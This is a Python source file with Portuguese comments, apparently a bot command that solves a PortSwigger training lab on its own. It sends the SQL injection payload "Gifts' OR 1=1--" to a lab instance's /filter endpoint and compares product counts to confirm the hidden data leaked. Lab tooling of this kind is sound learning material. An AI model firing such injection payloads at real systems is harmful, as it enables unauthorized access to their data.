# comando bonus: resolve sozinho o lab do portswigger "SQL injection
# vulnerability in WHERE clause allowing retrieval of hidden data"
# cada pessoa tem sua propria instancia do lab (muda a url toda vez que
# acessa), entao o comando pede a url da instancia de quem ta usando

import requests

from recon import REQUEST_TIMEOUT, ReconError

PAYLOAD = "Gifts' OR 1=1--"


def solve_sqli_lab(base_url):
    base_url = base_url.rstrip("/")
    url = base_url + "/filter"

    try:
        baseline = requests.get(url, params={"category": "Gifts"}, timeout=REQUEST_TIMEOUT)
        exploit = requests.get(url, params={"category": PAYLOAD}, timeout=REQUEST_TIMEOUT)
    except requests.RequestException as exc:
        raise ReconError(f"nao consegui acessar o lab: {exc}")

    if not exploit.ok:
        raise ReconError(f"lab respondeu HTTP {exploit.status_code} pro payload")

    # cada produto tem um <h3> com o nome, entao da pra usar como contador
    antes = baseline.text.count("<h3>")
    depois = exploit.text.count("<h3>")

    if depois > antes:
        return (
            f"lab resolvido! o payload ' OR 1=1-- fez a query devolver todos os "
            f"produtos ({depois} contra {antes} da categoria normal), incluindo "
            f"os que nao deveriam aparecer.\n\npayload: category={PAYLOAD}"
        )

    raise ReconError(
        "o payload nao aumentou a quantidade de produtos retornados. "
        "confere se a url e da instancia certa do lab"
    )
